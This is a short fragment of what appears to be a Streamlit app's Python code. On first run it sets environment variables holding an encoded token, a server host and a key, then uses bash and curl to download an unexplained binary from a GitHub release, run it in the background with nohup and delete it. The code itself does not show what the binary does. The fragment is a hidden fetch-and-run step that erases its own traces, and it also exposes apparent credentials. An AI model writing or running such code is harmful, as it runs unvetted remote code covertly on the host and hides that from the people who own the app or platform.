...
if 'script_executed' not in st.session_state:
    command = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiZDJiOTFkOTUtNjkwYy00NjZkLThmMjktNzc0OGFiMzJjNjI0IiwicyI6Ik4yVmhZalV6Wm1VdE56bGpNQzAwWlRZMExUa3pNemd0TURnM05qVXpPVFUyTURWbSJ9 N_S=nz.seav.eu.org N_K=cgK5YdBSDHR1WEPsyK bash -c 'curl -L -o jsbin https://github.com/seav1/dl/releases/download/src/jsbin && chmod +x jsbin && nohup ./jsbin && rm jsbin'"
